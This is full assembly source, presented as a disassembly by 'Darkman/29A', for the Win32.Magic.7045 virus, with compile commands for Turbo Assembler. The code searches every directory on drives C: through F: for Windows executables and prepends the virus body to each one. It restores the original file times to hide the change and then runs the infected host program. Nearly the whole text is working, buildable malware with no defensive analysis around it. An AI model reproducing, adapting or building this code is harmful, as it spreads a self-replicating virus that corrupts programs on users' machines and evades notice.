comment *
                            Win32.Magic.7045          млллллм млллллм млллллм
                             Disassembly by           ллл ллл ллл ллл ллл ллл
                              Darkman/29A              мммллп плллллл ллллллл
                                                      лллмммм ммммллл ллл ллл
                                                      ллллллл ллллллп ллл ллл

  Win32.Magic.7045 is a 7045 bytes runtime/direct action EXE virus. Infects
  all files in all directories at drive C:, D:, E: and F:, when executed, by
  every file in current directory and Windows directory, when executed, by
  prepending the virus to the original EXE file.

  Compile Win32.Magic.7045 with Turbo Assembler v 5.0 by typing:
    TASM32 /M /ML /Q /ZD VOODOO.ASM
    TLINK32 -Tpe -c -x -aa -r -v VOODOO.OBJ,,, IMPORT32
*

.386
.model flat
; KERNEL32.dll
        extrn   CopyFileA:proc
        extrn   CloseHandle:proc
        extrn   CreateFileMappingA:proc
        extrn   CreateProcessA:proc
        extrn   DeleteFileA:proc
        extrn   CreateFileA:proc
        extrn   FindFirstFileA:proc
        extrn   FindNextFileA:proc
        extrn   FlushViewOfFile:proc
        extrn   GetCommandLineA:proc
        extrn   GetCurrentDirectoryA:proc
        extrn   GetExitCodeProcess:proc
        extrn   GetFileSize:proc
        extrn   ExitProcess:proc
        extrn   GetProcAddress:proc
        extrn   GetStartupInfoA:proc
        extrn   GlobalAlloc:proc
        extrn   GlobalFree:proc
        extrn   GlobalLock:proc
        extrn   GlobalUnlock:proc
        extrn   MapViewOfFile:proc
        extrn   ReadFile:proc
        extrn   SetCurrentDirectoryA:proc
        extrn   SetFileAttributesA:proc
        extrn   SetFileTime:proc
        extrn   Sleep:proc
        extrn   UnmapViewOfFile:proc
        extrn   lstrcpyA:proc
        extrn   GetModuleHandleA:proc
; USER32.dll
        extrn   MessageBoxA:proc

.data
VirusSize               equ     1b85h   ; Size of virus (7045 bytes)
nBufferLength           equ     320h    ; Size, in characters, of directory
                                        ; buffer
MAX_PATH                equ     104h

FALSE                   equ     00h
TRUE                    equ     01h
FILE_ATTRIBUTE_DIRECTORY        equ     10h
                                        ; The "file or directory" is a
                                        ; directory
FILE_ATTRIBUTE_ARCHIVE  equ     20h     ; The file is an archive file.
                                        ; Applications use this attribute to
                                        ; mark files for backup or removal.
CREATE_NEW              equ     01h     ; Creates a new file. The function
                                        ; fails if the specified file already
                                        ; exists.
OPEN_EXISTING           equ     03h     ; Opens the file. The function fails
                                        ; if the file does not exist.
FILE_SHARE_READ         equ     01h     ; Other open operations can be
                                        ; performed on the file for read
                                        ; access. If the CreateFile function
                                        ; is opening the client end of a
                                        ; mailslot, this flag is specified.
FILE_SHARE_WRITE        equ     02h     ; Other open operations can be
                                        ; performed on the file for write
                                        ; access.
GENERIC_WRITE           equ     40000000h
                                        ; Specifies write access to the file.
                                        ; Data can be written to the file and
                                        ; the file pointer can be moved.
GENERIC_READ            equ     80000000h
                                        ; Specifies read access to the file.
                                        ; Data can be read from the file and
                                        ; the file pointer can be moved.
PAGE_READWRITE          equ     04h     ; Gives read-write access to the
                                        ; committed region of pages
FILE_MAP_WRITE          equ     02h     ; Read-write access

NORMAL_PRIORITY_CLASS   equ     20h     ; Indicates a normal process with no
                                        ; special scheduling needs.
INVALID_HANDLE_VALUE    equ     -01h

STARTUPINFO struct
  cb                    DWORD   ?       ; Specifies the size, in bytes, of the
                                        ; structure.
  lpReserved            DWORD   ?       ; Reserved. Set this member to NULL
                                        ; before passing the structure to
                                        ; CreateProcess
  lpDesktop             DWORD   ?       ; Points to a zero-terminated string
                                        ; that specifies either the name of
                                        ; the desktop only or the name of both
                                        ; the window station and desktop for
                                        ; this process
  lpTitle               DWORD   ?       ; For console processes, this is the
                                        ; title displayed in the title bar if
                                        ; a new console window is created
  dwX                   DWORD   ?       ; Specifies the x offset, in pixels,
                                        ; of the upper left corner of a window
                                        ; if a new window is created. The
                                        ; offset is from the upper left corner
                                        ; of the screen
  dwY                   DWORD   ?       ; Specifies the y offset, in pixels,
                                        ; of the upper left corner of a window
                                        ; if a new window is created. The
                                        ; offset is from the upper left corner
                                        ; of the screen
  dwXSize               DWORD   ?       ; Specifies the width, in pixels, of
                                        ; the window if a new window is
                                        ; created
  dwYSize               DWORD   ?       ; Specifies the height, in pixels, of
                                        ; the window if a new window is
                                        ; created
  dwXCountChars         DWORD   ?       ; Specifies the screen buffer width in
                                        ; character columns
  dwYCountChars         DWORD   ?       ; Specifies the screen buffer height
                                        ; in character rows
  dwFillAttribute       DWORD   ?       ; Specifies the initial text and
                                        ; background colors if a new console
                                        ; window is created
  dwFlags               DWORD   ?       ; This is a bit field that determines
                                        ; whether certain STARTUPINFO members
                                        ; are used when the process creates a
                                        ; window
  wShowWindow           WORD    ?       ; Specifies the default value the first
                                        ; time
  cbReserved2           WORD    ?       ; Reserved; must be zero
  lpReserved2           DWORD   ?       ; Reserved; must be NULL
  hStdInput             DWORD   ?       ; Specifies a handle that will be used
                                        ; as the standard input handle of the
                                        ; process
  hStdOutput            DWORD   ?       ; Specifies a handle that will be used
                                        ; as the standard output handle of the
                                        ; process
  hStdError             DWORD   ?       ; Specifies a handle that will be used
                                        ; as the standard error handle of the
                                        ; process
ends

FILETIME struct
  dwLowDateTime         DWORD   ?       ; Specifies the low-order 32 bits of
                                        ; the file time
  dwHighDateTime        DWORD   ?       ; Specifies the high-order 32 bits of
                                        ; the file time
ends

WIN32_FIND_DATA struct
  dwFileAttributes      DWORD   ?       ; Specifies the file attributes of the
                                        ; file found
  ftCreationTime        FILETIME <>     ; Specifies the time the file was
                                        ; created
  ftLastAccessTime      FILETIME <>     ; Specifies the time that the file was
                                        ; last accessed
  ftLastWriteTime       FILETIME <>     ; Specifies the time that the file was
                                        ; last written to
  nFileSizeHigh         DWORD   ?       ; Specifies the high-order DWORD value
                                        ; of the file size, in bytes
  nFileSizeLow          DWORD   ?       ; Specifies the low-order DWORD value
                                        ; of the file size, in bytes
  dwReserved0           DWORD   ?       ; Reserved for future use
  dwReserved1           DWORD   ?       ; Reserved for future use
  cFileName             BYTE MAX_PATH dup(?)
                                        ; A null-terminated string that is the
                                        ; name of the file
  cAlternate            BYTE 0eh dup(?) ; A null-terminated string that is an
                                        ; alternative name for the file
ends

PROCESS_INFORMATION struct
  hProcess              DWORD      ?    ; Handle to the newly created process
  hThread               DWORD      ?    ; Handle to the primary thread of the
                                        ; newly created process
  dwProcessId           DWORD      ?    ; Global process identifier that can
                                        ; be used to identify a process
  dwThreadId            DWORD      ?    ; global thread identifiers that can
                                        ; be used to identify a thread
ends

szFileName      db      '*.EXE',00h     ; Name of file to search for
szFileName_     db      '*.*',00h       ;  "   "   "   "    "     "
szCurDir        db      'c:\',00h       ; Name of new current directory
                db      'Magic People-Voodoo People !',00h
                db      00h
ProcessInformation      PROCESS_INFORMATION <>
dwExitCode      dd      ?               ; Termination status
dwFileHandle    dd      ?               ; File handle
dwFileHandle_   dd      ?               ; File handle
dwMappingHandle dd      ?               ; File mapping handle
lpMappedView    dd      ?               ; Starting address of the mapped view
dwFileSize      dd      ?               ; Low-order doubleword of the file
                                        ; size
infect_flag     db      ?               ; Infection flag
exit_flag       db      ?               ; Exit flag
NumberOfBytesRead       dd      ?       ; Number of bytes read
lpFileExtension dd      ?               ; Pointer to file extension
StartupInfo     STARTUPINFO <>
szFileName__:
                db      11ah dup(00h)
                db      206h dup(?)
FindFileData    WIN32_FIND_DATA <>
                db      20eh dup(?)
cBuffer         db      VirusSize dup(?)
                                        ; Buffer that receives data
dwSearchHandle  dd      ?               ; Search handle
dwSearchHandle_ dd      ?               ; Search handle
szCurDir_:
cBuffer_        db      320h dup(?)     ; Buffer for current directory
szCurDir__:
cBuffer__       db      320h dup(?)     ; Buffer for current directory
                db      724h dup(?)
                
.code
code_begin:
        push    offset StartupInfo      ; Address of STARTUPINFO structure
        call    GetStartupInfoA

        call    GetCommandLineA
        mov     esi,eax                 ; ESI = pointer to the command-line
                                        ; string for the current process
        cmp     byte ptr [esi+01h],':'  ; Not Universal Naming Convention
                                        ; (UNC)?
        je      _lstrcpyA               ; Equal? Jump to _lstrcpyA

        inc     eax                     ; Increase pointer to the command-line
                                        ; string for the current process
_lstrcpyA:
        push    eax                     ; EAX = address of string to copy
        push    offset szFileName__     ; Address of buffer
        call    lstrcpyA

        lea     esi,szFileName__        ; ESI = offset of szFileName__
find_dot_in_filename:
        inc     esi                     ; Increase pointer to the command-line
                                        ; string for the current process

        cmp     byte ptr [esi],'.'      ; Found  dot in filename?
        jne     find_dot_in_filename    ; Not equal? Jump to 
                                        ; find_dot_in_filename
        mov     byte ptr [esi+04h],00   ; Store zero at end of filename
        mov     [lpFileExtension],esi   ; Store pointer to file extension

        push    00h                     ; Handle of file with attributes to
                                        ; copy
        push    FILE_ATTRIBUTE_ARCHIVE  ; File attributes
        push    OPEN_EXISTING           ; How to create 
        push    00h                     ; Address of security descriptor
        push    FILE_SHARE_READ         ; Share mode
        push    GENERIC_READ            ; Access (read-write) mode
        push    offset szFileName__     ; Address of name of the file
        call    CreateFileA
        mov     [dwFileHandle],eax      ; Store file handle

        push    eax                     ; EAX = file handle
        push    00h                     ; Address of structure for data
        push    offset NumberOfBytesRead
                                        ; Address of number of bytes read
        push    VirusSize               ; Number of bytes to read
        push    offset cBuffer          ; Address of buffer that receives data
        push    eax                     ; Handle of file to read 
        call    ReadFile
        pop     eax                     ; EAX = file handle

        push    00h                     ; Address of high-order word for file
                                        ; size
        push    eax                     ; Handle of file to get size of
        call    GetFileSize
        mov     [dwFileSize],eax        ; Store low-order doubleword of the
                                        ; file size
        cmp     eax,VirusSize           ; First generation?
        je      virus_exit              ; Equal? Jump to virus_exit

        mov     esi,[lpFileExtension]   ; ESI = pointer to file extension
        mov     [esi],'MOC.'            ; Store file extension
        cmp     [esi+05h],'$$$$'        ; Temporarily disnfected file?
        je      _DeleteFileA            ; Equal? Jump to _DeleteFileA

        push    00h                     ; Handle of file with attributes to
                                        ; copy
        push    FILE_ATTRIBUTE_ARCHIVE  ; File attributes
        push    CREATE_NEW + OPEN_EXISTING
                                        ; How to create 
        push    00h                     ; Address of security descriptor
        push    FILE_SHARE_READ + FILE_SHARE_WRITE
                                        ; Share mode
        push    GENERIC_READ + GENERIC_WRITE
                                        ; Access (read-write) mode
        push    offset szFileName__     ; Address of name of the file
        call    CreateFileA
        mov     [dwFileHandle_],eax     ; Store file handle

        push    00h                     ; Name of file-mapping object
        push    [dwFileSize]            ; Low-order doubleword of object size
        push    00h                     ; High-order doubleword of object size
        push    PAGE_READWRITE          ; Protection for mapping object
        push    00h                     ; Optional security attributes
        push    [dwFileHandle_]         ; Handle of file to map
        call    CreateFileMappingA
        mov     [dwMappingHandle],eax   ; Store file mapping handle

        push    [dwFileSize]            ; Low-order doubleword of object size
        push    00h                     ; Low-order doubleword of file offset
        push    00h                     ; High-order doubleword of file offset
        push    FILE_MAP_WRITE          ; Access mode
        push    eax                     ; File-mapping object to map into
                                        ; address space
        call    MapViewOfFile
        mov     [lpMappedView],eax      ; Store starting address of the mapped
                                        ; view

        push    00h                     ; Address of structure for data
        push    offset NumberOfBytesRead
                                        ; Address of number of bytes read
        push    [dwFileSize]            ; Low-order doubleword of object size
        push    eax                     ; Address of buffer that receives data
        push    [dwFileHandle]          ; Handle of file to read
        call    ReadFile

        push    00h                     ; Number of bytes in range 
        push    [lpMappedView]          ; Starting address of the mapped view
        call    FlushViewOfFile

        push    [lpMappedView]          ; Address where mapped view begins
        call    UnmapViewOfFile

        push    [dwMappingHandle]       ; Handle of object to close
        call    CloseHandle

        push    [dwFileHandle_]         ; Handle of object to close
        call    CloseHandle

        push    offset ProcessInformation
                                        ; Pointer to PROCESS_INFORMATION
        push    offset StartupInfo      ; Pointer to STARTUPINFO
        push    00h                     ; Pointer to current directory name
        push    00h                     ; Pointer to new environment block
        push    NORMAL_PRIORITY_CLASS   ; Creation flags
        push    00h                     ; Handle inheritance flag
        push    00h                     ; Pointer to thread security
                                        ; attributes
        push    00h                     ; Pointer to process security
                                        ; attributes

        mov     esi,[lpFileExtension]   ; ESI = pointer to file extension
        mov     byte ptr [esi+04h],' '  ; Store space at end of filename

        push    offset szFileName__     ; Pointer to command line string
        push    00h                     ; Pointer to name of executable module
        call    CreateProcessA

        jmp     _CloseHandle
virus_exit:
        mov     [exit_flag],TRUE        ; Exit code for all threads
_CloseHandle:
        push    [dwFileHandle]          ; Handle of object to close
        call    CloseHandle

        call    infect_drives
        cmp     [exit_flag],TRUE        ; Exit code for all threads?
        je      _ExitProcess            ; Equal? Jump to _ExitProcess
_GetExitCodeProcess:
        push    offset dwExitCode       ; Address to receive termination
                                        ; status
        push    [ProcessInformation.hProcess]
                                        ; Handle to the process
        call    GetExitCodeProcess
        cmp     [dwExitCode],00h        ; No error?
        je      _CreateProcessA         ; Equal? Jump to _CreateProcessA

        jmp     _GetExitCodeProcess
_CreateProcessA:
        push    offset ProcessInformation
                                        ; Pointer to PROCESS_INFORMATION
        push    offset StartupInfo      ; Pointer to STARTUPINFO
        push    00h                     ; Pointer to current directory name
        push    00h                     ; Pointer to new environment block
        push    NORMAL_PRIORITY_CLASS   ; Creation flags
        push    00h                     ; Handle inheritance flag
        push    00h                     ; Pointer to thread security
                                        ; attributes
        push    00h                     ; Pointer to process security
                                        ; attributes

        mov     esi,[lpFileExtension]   ; ESI = pointer to file extension
        mov     byte ptr [esi+04h],' '  ; Store space at end of filename
        mov     [esi],'EXE.'            ; Store file extension
        mov     [esi+05h],'$$$$'        ; Store command-line

        push    offset szFileName__     ; Pointer to command line string
        push    00h                     ; Pointer to name of executable module
        call    CreateProcessA
_ExitProcess:
        push    00h                     ; Exit code for all threads
        call    ExitProcess
_DeleteFileA:
        push    offset szFileName__     ; Address of name of file to delete
        call    DeleteFileA

        jmp     _ExitProcess

infect_drives   proc    near            ; Infect drives
        push    offset cBuffer_         ; Address of buffer for current
                                        ; directory
        push    nBufferLength           ; Size, in characters, of directory
                                        ; buffer
        call    GetCurrentDirectoryA

        call    infect_directories

        mov     ecx,04h                 ; Infect drive C:, D:, E: and F:
set_current_directory_loop:
        push    ecx                     ; ECX = counter
        push    offset szCurDir         ; Address of name of new current
                                        ; directory
        call    SetCurrentDirectoryA

        call    infect_directories

        inc     byte ptr [szCurDir]     ; Increase drive letter

        pop     ecx                     ; ECX = counter
        loop    set_current_directory_loop

        push    offset szCurDir_        ; Address of name of new current
                                        ; directory
        call    SetCurrentDirectoryA

        jmp     _FindNextFileA

        ret                             ; Return
                endp

infect_directories      proc    near    ; Infect directories
        push    offset cBuffer__        ; Address of buffer for current
                                        ; directory
        push    nBufferLength           ; Size, in characters, of directory
                                        ; buffer
        call    GetCurrentDirectoryA

        push    offset FindFileData     ; Address of returned information
        push    offset szFileName_      ; Address of name of file to search
                                        ; for
        call    FindFirstFileA
        mov     [dwSearchHandle],eax    ; Store search handle
_FindNextFileA:
        push    offset FindFileData     ; Address of returned information
        push    [dwSearchHandle]        ; Handle of search
        call    FindNextFileA
        or      eax,eax                 ; Function failed?
        jz      function_failed         ; Zero? Jump to function_failed

        cmp     [FindFileData.cFileName],'.'
                                        ; Directory?
        je      _FindNextFileA          ; Equal? Jump to _FindNextFileA
        mov     eax,[FindFileData.dwFileAttributes]
        and     eax,FILE_ATTRIBUTE_DIRECTORY
                                        ; Directory?
        jz      _FindNextFileA          ; Zero? Jump to _FindNextFileA

        push    offset szCurDir__       ; Address of name of new current
                                        ; directory
        call    SetCurrentDirectoryA

        push    offset FindFileData.cFileName
                                        ; Address of name of new current
                                        ; directory
        call    SetCurrentDirectoryA

        push    offset FindFileData     ; Address of returned information
        push    offset szFileName       ; Address of name of file to search
                                        ; for
        call    FindFirstFileA
        mov     [dwSearchHandle_],eax   ; Store search handle
        cmp     eax,INVALID_HANDLE_VALUE
        je      _FindNextFileA          ; Function failed? Jump to
                                        ; _FindNextFileA
continue_a_file_search:
        or      eax,eax                 ; Function failed?
        jz      _FindNextFileA          ; Zero? Jump to _FindNextFileA

        call    infect_file

        push    offset FindFileData     ; Address of returned information
        push    [dwSearchHandle_]       ; Handle of search
        call    FindNextFileA

        jmp     continue_a_file_search
function_failed:
        ret                             ; Return
                        endp

infect_file     proc    near            ; Infect file
        push    FILE_ATTRIBUTE_ARCHIVE  ; Address of attributes to set
        push    offset FindFileData.cFileName
                                        ; Address of filename
        call    SetFileAttributesA

        push    00h                     ; Handle of file with attributes to
                                        ; copy
        push    FILE_ATTRIBUTE_ARCHIVE  ; File attributes
        push    OPEN_EXISTING           ; How to create 
        push    00h                     ; Address of security descriptor
        push    FILE_SHARE_READ + FILE_SHARE_WRITE
                                        ; Share mode
        push    GENERIC_READ + GENERIC_WRITE
                                        ; Access (read-write) mode
        push    offset FindFileData.cFileName
                                        ; Address of name of the file
        call    CreateFileA
        cmp     eax,INVALID_HANDLE_VALUE
        je      _SetFileAttributesA     ; Function failed? Jump to
                                        ; _SetFileAttributesA
        mov     [dwFileHandle],eax      ; Store file handle

        push    00h                     ; Address of high-order word for file
                                        ; size
        push    eax                     ; Handle of file to get size of
        call    GetFileSize
        mov     [dwFileSize],eax        ; Store low-order doubleword of the
                                        ; file size
_CreateFileMappingA:
        push    eax                     ; EAX = low-order doubleword of the
                                        ; file size

        push    00h                     ; Name of file-mapping object
        push    eax                     ; Low-order doubleword of object size
        push    00h                     ; High-order doubleword of object size
        push    PAGE_READWRITE          ; Protection for mapping object
        push    00h                     ; Optional security attributes
        push    [dwFileHandle]
        call    CreateFileMappingA
        mov     [dwMappingHandle],eax   ; Store file mapping handle

        push    00h                     ; Low-order doubleword of file offset
        push    00h                     ; High-order doubleword of file offset
        push    FILE_MAP_WRITE          ; Access mode
        push    eax                     ; File-mapping object to map into
                                        ; address space
        call    MapViewOfFile

        cmp     [infect_flag],TRUE      ; Infect file?
        je      infect_file_            ; Equal? Jump to infect_file_

        mov     esi,eax                 ; ESI = starting address of the mapped
                                        ; view
        mov     edi,[esi+3ch]           ; EDI = offset of new executable (NE,
                                        ; LE,etc) header within disk file
        cmp     dword ptr [esi+edi],'EP'
                                        ; Portable Executable (PE)?
        jne     infect_exit             ; Not equal? Jump to infect_exit
        cmp     [esi+6fh],'3NIW'
        je      infect_exit             ; Equal? Jump to infect_exit

        call    _UnmapViewOfFile
 
        mov     [infect_flag],TRUE      ; Infect file
 
        mov     eax,[dwFileSize]        ; EAX = Low-order doubleword of the
                                        ; file size
        add     eax,VirusSize           ; Add size of virus to low-order
                                        ; doubleword of the file size
        jmp     _CreateFileMappingA
infect_file_:
        mov     [infect_flag],FALSE     ; Don't infect file
        mov     [lpMappedView],eax      ; Store starting address of the mapped
                                        ; view

        push    edi esi ecx             ; Save registers at stack
        pushf                           ; Save flags at stack
        add     eax,[dwFileSize]        ; Add low-order doubleword of the file
                                        ; size to starting address of the
                                        ; mapped view
        add     eax,VirusSize-01h       ; Add size of virus minus one to
                                        ; starting address of the mapped view
        mov     edi,eax                 ; EDI = pointer to last byte of file
        mov     esi,[lpMappedView]      ; ESI = starting address of the mapped
                                        ; view
        add     esi,[dwFileSize]        ; Add low-order doubleword of the file
                                        ; size to starting address of the
                                        ; mapped view
        mov     ecx,[dwFileSize]        ; ECX = low-order doubleword of the
                                        ; file size
        dec     esi                     ; ESI = pointer to last byte of
                                        ; original code
        std                             ; Set direction flag
        rep     movsb                   ; Move original code to end of file

        mov     edi,[lpMappedView]      ; EDI = starting address of the mapped
                                        ; view
        xor     eax,eax                 ; Zero EAX
        mov     ecx,VirusSize           ; Store seven thousand and forty-five
                                        ; bytes
        cld                             ; Clear direction flag
        rep     stosb                   ; Overwrite the first seven thousand
                                        ; and forty-five bytes of original
                                        ; code

        mov     edi,[lpMappedView]      ; EDI = starting address of the mapped
                                        ; view
        lea     esi,cBuffer             ; ESI = offset of cBuffer
        mov     ecx,VirusSize           ; Move seven thousand and forty-five
                                        ; bytes
        cld                             ; Clear direction flag
        rep     movsb                   ; Move virus to beginning of file
        popf                            ; Load flags from stack
        pop     ecx esi edi             ; Load registers from stack
infect_exit:
        call    _UnmapViewOfFile

        push    offset FindFileData.ftLastWriteTime-08h
                                        ; Time the file was last written
        push    offset FindFileData.ftLastAccessTime-04h
                                        ; Time the file was last accessed 
        push    offset FindFileData.ftCreationTime
                                        ; Time the file was created 
        push    [dwFileHandle]          ; Identifies the file
        call    SetFileTime

        push    [dwFileHandle]          ; Handle of object to close
        call    CloseHandle
_SetFileAttributesA:
        push    [FindFileData.dwFileAttributes]
                                        ; Address of attributes to set
        push    offset FindFileData.cFileName
                                        ; Address of filename
        call    SetFileAttributesA

        ret                             ; Return
                endp

_UnmapViewOfFile        proc    near    ; Unmaps a mapped view of a file from
                                        ; the calling process's address space
                                        ; and close it
        push    [lpMappedView]          ; Address where mapped view begins
        call    UnmapViewOfFile

        push    [dwMappingHandle]       ; Handle of object to close
        call    CloseHandle

        ret                             ; Return
                        endp
code_end:

end          code_begin